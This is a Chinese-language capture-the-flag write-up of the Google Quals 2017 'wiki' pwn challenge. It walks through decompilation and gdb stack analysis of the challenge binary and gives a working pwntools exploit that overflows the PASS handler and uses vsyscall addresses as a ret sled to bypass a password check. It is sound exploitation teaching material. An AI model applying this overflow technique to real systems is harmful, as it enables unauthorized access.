# 考察点
- 滑板指令对抗 stack overflow 利用中的 ASLR 机制，但 NX 存在
- 程序存在 Vsyscall 替代滑板指令，进一步避开 NX 机制
- stack overflow 利用，对栈的观察
- init 函数

# 分析
```shell
➜  googlequals17_pwn_wiki ./challenge 


^C              # 不给反应
➜  googlequals17_pwn_wiki file ./challenge 
./challenge: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=b0bf486a495913bb2702825c5b41d5823f16b9ac, stripped
➜  googlequals17_pwn_wiki checksec challenge 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled      # 栈不可执行
    PIE:        PIE enabled     # 地址随机化

```

IDA
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  __int64 (__fastcall **v3)(); // rsi
  char *v4; // rdi
  __int64 i; // rcx
  char main_buff_32[32]; // [rsp+8h] [rbp-20h] BYREF

  v3 = &off_2020A0;                             // 某个和flag 高度相关的函数调用偏移
  v4 = main_buff_32;
  for ( i = 6LL; i; --i )
  {
    *(_DWORD *)v4 = *(_DWORD *)v3;
    v3 = (__int64 (__fastcall **)())((char *)v3 + 4);
    v4 += 4;
  }
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  Menu(main_buff_32);       // menu
}
```

```c
// 传入main 长度 32的buffer
void __fastcall __noreturn Menu(__int64 buffer_pass)
{
  __int64 v1; // r12
  char local_buff_153[153]; // [rsp+Fh] [rbp-99h] BYREF

  v1 = 0LL;
  while ( 1 )
  {
    while ( 1 )
    {
      memset(local_buff_153, 0, 0x81uLL);
      getInput(0);
      if ( !(unsigned int)compare(local_buff_153, "USER") )     // menu 比对输入指令，进入不同的函数，由于开启了 ASLR，因此需要 gdb 查看分别对应什么函数
        break;
      if ( v1 )
        _exit(0);
      v1 = (*(__int64 (**)(void))(buffer_pass + 8))();//               function？ -> USER function
    }
    if ( (unsigned int)compare(local_buff_153, "PASS") )
    {
      (*(void (__fastcall **)(__int64))buffer_pass)(v1);//               function？-> pass function(参数为 user function 读取到的文件内容)
    }
    else if ( (unsigned int)compare(local_buff_153, "LIST") )
    {
      (*(void (**)(void))(buffer_pass + 16))(); //               function？ -> LIST function
    }
  }
}
```
与 menu 对应的反汇编内容
```shell

.text:0000000000000CE0                 mov     rsi, rbx
.text:0000000000000CE3                 call    getInput
.text:0000000000000CE8                 lea     rsi, aUser      ; "USER"
.text:0000000000000CEF                 mov     rdi, rbx
.text:0000000000000CF2                 call    compare
.text:0000000000000CF7                 test    eax, eax
.text:0000000000000CF9                 jz      short loc_D0F
.text:0000000000000CFB                 test    r12, r12
.text:0000000000000CFE                 jz      short loc_D07
.text:0000000000000D00                 xor     edi, edi        ; status
.text:0000000000000D02                 call    __exit
.text:0000000000000D07 ; ---------------------------------------------------------------------------
.text:0000000000000D07
.text:0000000000000D07 loc_D07:                                ; CODE XREF: Menu+47↑j
.text:0000000000000D07                 call    qword ptr [rbp+8]        # 断在这里，查看 rbp+8 内容，其余两处也是
.text:0000000000000D0A                 mov     r12, rax
.text:0000000000000D0D                 jmp     short loc_CCD
.text:0000000000000D0F ; ---------------------------------------------------------------------------
.text:0000000000000D0F
.text:0000000000000D0F loc_D0F:                                ; CODE XREF: Menu+42↑j
.text:0000000000000D0F                 lea     rsi, aPass      ; "PASS"
.text:0000000000000D16                 mov     rdi, rbx
.text:0000000000000D19                 call    compare
.text:0000000000000D1E                 test    eax, eax
.text:0000000000000D20                 jz      short loc_D2A
.text:0000000000000D22                 mov     rdi, r12
.text:0000000000000D25                 call    qword ptr [rbp+0]
.text:0000000000000D28                 jmp     short loc_CCD

```

```shell
# vmmap 查看本次运行时载入的空间布局
gdb-peda$ vmmap 
Start              End                Perm      Name
0x00005586bcc9c000 0x00005586bcc9e000 r-xp      /home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge
0x00005586bce9d000 0x00005586bce9e000 r--p      /home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge
0x00005586bce9e000 0x00005586bce9f000 rw-p      /home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge
0x00007fa011b42000 0x00007fa011d02000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007fa011d02000 0x00007fa011f02000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007fa011f02000 0x00007fa011f06000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007fa011f06000 0x00007fa011f08000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007fa011f08000 0x00007fa011f0c000 rw-p      mapped
0x00007fa011f0c000 0x00007fa011f32000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007fa012114000 0x00007fa012117000 rw-p      mapped
0x00007fa012131000 0x00007fa012132000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007fa012132000 0x00007fa012133000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007fa012133000 0x00007fa012134000 rw-p      mapped
0x00007ffc5811d000 0x00007ffc5813e000 rw-p      [stack]
0x00007ffc581b2000 0x00007ffc581b5000 r--p      [vvar]
0x00007ffc581b5000 0x00007ffc581b7000 r-xp      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
# 根据程序载入基址+偏移，计算下断点
gdb-peda$ b *0x00005586bcc9cd07
Breakpoint 1 at 0x5586bcc9cd07
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x7ffc5813b3bf --> 0x52455355 ('USER')
RCX: 0x7fa011c39360 (<read+16>: cmp    rax,0xfffffffffffff001)
RDX: 0x0 
RSI: 0x5586bcc9cea4 --> 0x5341500052455355 ('USER')
RDI: 0x7ffc5813b3bf --> 0x52455355 ('USER')
RBP: 0x7ffc5813b468 --> 0x5586bcc9cc5e (push   rbp)
RSP: 0x7ffc5813b3b0 --> 0x7ffc581b5280 (add    BYTE PTR ss:[rax],al)
RIP: 0x5586bcc9cd07 (call   QWORD PTR [rbp+0x8])
R8 : 0x7fa011f08780 --> 0x0 
R9 : 0x0 
R10: 0x37b 
R11: 0x246 
R12: 0x0 
R13: 0x7ffc5813b560 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5586bcc9ccfe:      je     0x5586bcc9cd07
   0x5586bcc9cd00:      xor    edi,edi
   0x5586bcc9cd02:      call   0x5586bcc9c950 <_exit@plt>
=> 0x5586bcc9cd07:      call   QWORD PTR [rbp+0x8]
   0x5586bcc9cd0a:      mov    r12,rax
   0x5586bcc9cd0d:      jmp    0x5586bcc9cccd
   0x5586bcc9cd0f:      lea    rsi,[rip+0x193]        # 0x5586bcc9cea9
   0x5586bcc9cd16:      mov    rdi,rbx
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7ffc5813b3b0 --> 0x7ffc581b5280 (add    BYTE PTR ss:[rax],al)
0008| 0x7ffc5813b3b8 --> 0x55007fa012133700 
0016| 0x7ffc5813b3c0 --> 0x524553 ('SER')
0024| 0x7ffc5813b3c8 --> 0x0 
0032| 0x7ffc5813b3d0 --> 0x0 
0040| 0x7ffc5813b3d8 --> 0x0 
0048| 0x7ffc5813b3e0 --> 0x0 
0056| 0x7ffc5813b3e8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005586bcc9cd07 in ?? ()
# 查看内容，三个函数的相应偏移
gdb-peda$ x/gx $rbp+8
0x7ffc5813b470: 0x00005586bcc9cda1  # USER_function offset 0xda1
gdb-peda$ x/gx $rbp  
0x7ffc5813b468: 0x00005586bcc9cc5e  # PASS_function offset 0xc5e
gdb-peda$ x/gx $rbp+16
0x7ffc5813b478: 0x00005586bcc9cba5  # LIST_function offset 0xba5
```

返回 IDA 分析，首先是 USER_function -> offset 0xda1
```C
char *USER_function()       // 输入文件名，做 /db 拼接，然后尝试打开，读取其中内容
{
  __int64 v0; // rcx
  char *v1; // rdi
  char file[3]; // [rsp+Ch] [rbp-9Ch] BYREF
  char v4[153]; // [rsp+Fh] [rbp-99h] BYREF

  v0 = 33LL;
  v1 = file;
  while ( v0 )
  {
    *(_DWORD *)v1 = 0;
    v1 += 4;
    --v0;
  }
  qmemcpy(file, "db/", sizeof(file));
  getInput(0, (__int64)v4, 128LL);
  if ( strchr(v4, '/') )
    _exit(0);
  return ReadFile(file);
}
```
其次，passFunction  -> offset 0xc5e
```C
__int64 __fastcall passFunction(__int64 a1)
{
  __int64 v2; // rcx
  _DWORD *v3; // rdi
  int v4; // edi
  __int64 result; // rax
  _BYTE input[152]; // [rsp+0h] [rbp-98h] BYREF

  v2 = 32LL;
  v3 = input;
  while ( v2 )
  {
    *v3++ = 0;
    --v2;
  }
  v4 = 0;
  if ( (getInput(0, (__int64)input, 010000LL) & 7) != 0 )   // overflow vuln
LABEL_7:
    _exit(v4);
  result = compare((__int64)input, a1);         // 对比内容，匹配了才会执行下面的，受比对的二者分别是 输入，和 USER function 读取到的文件内容
  if ( (_DWORD)result )
  {
    v4 = system("cat flag.txt");
    goto LABEL_7;
  }
  return result;
}
```
然后是 listFunction -> offset 0xba5

```c
int listFunction()      // 列举 db/ 下的内容
{
  DIR *v0; // rbx
  struct dirent *v1; // rax

  v0 = opendir("db");
  if ( !v0 )
    _exit(0);
  while ( 1 )
  {
    v1 = readdir(v0);
    if ( !v1 )
      break;
    if ( v1->d_name[0] != '.' )
      puts(v1->d_name);
  }
  return closedir(v0);
}
```

重点是对  passFunction 函数下手，因为有溢出，并且和flag 文件相关。摸清程序的大致功能：
```shell
➜  googlequals17_pwn_wiki ./challenge 
LIST                                    # LIST 出题目 db目录下存在的文件，存在以下 3个文件
xmlset_roodkcableoj28840ybtide
Fortimanager_Access
1MB@tMaN
USER                                    # 调用 USER function，读入db目录下的相应文件中的内容
1MB@tMaN
PASS
guess the exact content of file in db dir.    # 猜测内容
```
验证上述思路，因为上帝视角，可以先查看一下内容：
```shell
➜  googlequals17_pwn_wiki ./challenge 
USER
1MB@tMaN
PASS
jW2LtVF1l6AWNCdk4ne8Qs+7gupuWlVW        # 解决 challenage 在于设法读取目标文件中的内容，要么就绕过 pass function 中的 compare
flag{not_actual_flag_just_local_flag}
```
看下 pass function 中的 commpare
```shell
.text:0000000000000C89                 jnz     short loc_CA8
.text:0000000000000C8B                 mov     rsi, rbp   # 比对参数1，使用 User function 之后读取进来的内容，可以看到 使用了 rbp 进行传递
.text:0000000000000C8E                 mov     rdi, rsp   # 比对参数2，在终端提交的输入
.text:0000000000000C91                 call    compare    # 执行compare
.text:0000000000000C96                 test    eax, eax
.text:0000000000000C98                 jz      short loc_CAD
.text:0000000000000C9A                 lea     rdi, command    ; "cat flag.txt"
.text:0000000000000CA1                 call    _system
.text:0000000000000CA6                 mov     edi, eax        ; status
```
**思路：因此在调用到该位置时，如果对 rbp 可控，或者可预料，那么传入相同的内容，即可突破 compare 逻辑，cat flag**

pass function 存在 overflow，**自然而然地想去覆盖返回地址，但覆盖成什么呢？需要观测一下 ret 的栈内容**

- 程序开启了 ASLR，通常 可以利用滑板指令，但还存在 NX，因此需要做泄露，但本题找不到泄漏点，只能查看类似的

看了 exp，才发现本体中存在 vscall（linux机制）这个 call的指令地址每次加载程序都是静态的
```shell
gdb-peda$ vmmap                   
Start              End                Perm      Name
0x0000557d2ea1e000 0x0000557d2ea20000 r-xp      /home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge
0x0000557d2ec1f000 0x0000557d2ec20000 r--p      /home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge
0x0000557d2ec20000 0x0000557d2ec21000 rw-p      /home/pitta/workspace/pwn_learn/rec0rd/Stack/googlequals17_pwn_wiki/challenge
0x00007ff917f99000 0x00007ff918159000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ff918159000 0x00007ff918359000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ff918359000 0x00007ff91835d000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ff91835d000 0x00007ff91835f000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ff91835f000 0x00007ff918363000 rw-p      mapped
0x00007ff918363000 0x00007ff918389000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ff91856b000 0x00007ff91856e000 rw-p      mapped
0x00007ff918588000 0x00007ff918589000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ff918589000 0x00007ff91858a000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ff91858a000 0x00007ff91858b000 rw-p      mapped
0x00007ffec3705000 0x00007ffec3726000 rw-p      [stack]
0x00007ffec37dc000 0x00007ffec37df000 r--p      [vvar]
0x00007ffec37df000 0x00007ffec37e1000 r-xp      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
gdb-peda$ x/10i 0xffffffffff600000
   0xffffffffff600000:  mov    rax,0x60 # 调用号
   0xffffffffff600007:  syscall 
   0xffffffffff600009:  ret  
```
查看调用号对应的 function
```shell
➜  workspace cat /usr/include/asm/unistd_64.h | grep 96
#define __NR_gettimeofday 96    
#define __NR_flistxattr 196
#define __NR_pwritev 296
```
可以看到，调用的是 gettimeofday，获取日期，然后system ret，由于 vsyscall 每次载入是静态的，并且内容是和程序上下文无关，因此可以作为滑板指令的填充，并且避开了 NX 机制

现在就看 pass function 的 overflow 能 flow 哪些内容
```shell
# 本次 gdb 载入的地址是 0x000055a63664f000, pass function 的 ret 偏移是 0xcb6，在ret 下断点，观察栈上内容
gdb-peda$ b *0x000055a63664fcb6
Breakpoint 1 at 0x55a63664fcb6

[------------------------------------stack-------------------------------------]
0000| 0x7fff4affb458 --> 0x55a63664fd28 (jmp    0x55a63664fccd)
0008| 0x7fff4affb460 --> 0x7fff4b140280 (add    BYTE PTR ss:[rax],al)
0016| 0x7fff4affb468 --> 0x50007fe88a5d9700 
0024| 0x7fff4affb470 --> 0x535341 ('ASS')
0032| 0x7fff4affb478 --> 0x0 
0040| 0x7fff4affb480 --> 0x0 
0048| 0x7fff4affb488 --> 0x0 
0056| 0x7fff4affb490 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000055a63664fcb6 in ?? ()
gdb-peda$ x/30gx $rsp
0x7fff4affb458: 0x000055a63664fd28      0x00007fff4b140280
0x7fff4affb468: 0x50007fe88a5d9700      0x0000000000535341
0x7fff4affb478: 0x0000000000000000      0x0000000000000000
0x7fff4affb488: 0x0000000000000000      0x0000000000000000
0x7fff4affb498: 0x0000000000000000      0x0000000000000000
0x7fff4affb4a8: 0x0000000000000000      0x0000000000000000
0x7fff4affb4b8: 0x0000000000000000      0x0000000000000000
0x7fff4affb4c8: 0x0000000000000000      0x0000000000000000
0x7fff4affb4d8: 0x0000000000000000      0x0000000000000000
0x7fff4affb4e8: 0x0000000000000000      0x0000000000000000
0x7fff4affb4f8: 0x000055a63664fe10      0x000055a63664fa8f
0x7fff4affb508: 0x000055a63664fa8f      0x000055a63664fe10(*)
0x7fff4affb518: 0x000055a63664fc5e(*)   0x000055a63664fda1
0x7fff4affb528: 0x000055a63664fba5      0x0000000000000000
0x7fff4affb538: 0x00007fe88a008840      0x0000000000000001
```
发现上边两处地址对应的位置分别时 init function（0xE10） 和 pass function（0xc5e）
```shell
text:0000000000000E10
.text:0000000000000E10 ; void init(void)
.text:0000000000000E10 init            proc near               ; DATA XREF: start+16↑o
.text:0000000000000E10 ; __unwind {
.text:0000000000000E10                 push    r15
.text:0000000000000E12                 mov     r15d, edi


text:0000000000000C5E
.text:0000000000000C5E
.text:0000000000000C5E passFunction    proc near               ; DATA XREF: .data:off_2020A0↓o
.text:0000000000000C5E ; __unwind {
.text:0000000000000C5E                 push    rbp
.text:0000000000000C5F                 xor     eax, eax
.text:0000000000000C61                 mov     rbp, rdi
.text:0000000000000C64                 mov     ecx, 20h ; ' '
.text:0000000000000C69                 mov     edx, 1000h
```

**上边分析 pass function 比对的目标内容是通过 rbp 传递，那么如果 init function 调用结束后的 rbp 可预料，那么init function 执行结束，ret 时进入 pass function 就会把可预料的 rbp 传递进去**

init function
```shell
.text:0000000000000E6A                 pop     rbx
.text:0000000000000E6B                 pop     rbp    # pwn
.text:0000000000000E6C                 pop     r12
.text:0000000000000E6E                 pop     r13
.text:0000000000000E70                 pop     r14
.text:0000000000000E72                 pop     r15
.text:0000000000000E74                 retn
```

于是，我们可以通过 overflow 覆盖第一次 pass function 的 ret address 为 vsyscall (因为是 static 的，不受 ASLR 影响),当作滑板直到 init function处，上述栈地址`0x7fff4affb510`

进入 init function，在 init function 结束时，会 pop rbp【其值为 0，至于为什么，不太清楚，可能是固定的机制？知道的，麻烦告知一下】，随后带着 pass function中 compare 相关的比对内容（rbp传递）进入 pass function，此时提交相同的内容就可以突破 compare


# exp

```python
# -*- coding: UTF-8 -*-

from pwn import *

pipe = process("./challenge")

print(pipe.sendline("USER"))
print(pipe.sendline("1MB@tMaN"))
print(pipe.sendline("PASS"))

payload = "A"*152   # pass function 用户输入的空间到 rbp
payload += p64(0xffffffffff600000) * 23 # 执行完所有 vsyscall 之后，会进入 init function，将 rbp =0 pop 出来
pipe.sendline(payload)

myRBP = "\x00" * 8      # 对标比对的 rbp 8字节
pipe.sendline(myRBP)    
pipe.interactive()
```
最后一次 sendline 是因为 init funcion 在栈中下一个地址是  pass function，因此需要提供猜测的内容，去和 rbp 传递进来的文件内容做比对，因为 init 结束之后 pop rbp 出来的值是0


执行结果
```shell
➜  googlequals17_pwn_wiki python ./exp.py
[+] Starting local process './challenge': pid 13989
[*] Switching to interactive mode
[*] Process './challenge' stopped with exit code 0 (pid 13989)
flag{not_actual_flag_just_local_flag}   # flag
[*] Got EOF while reading in interactive
$  
```
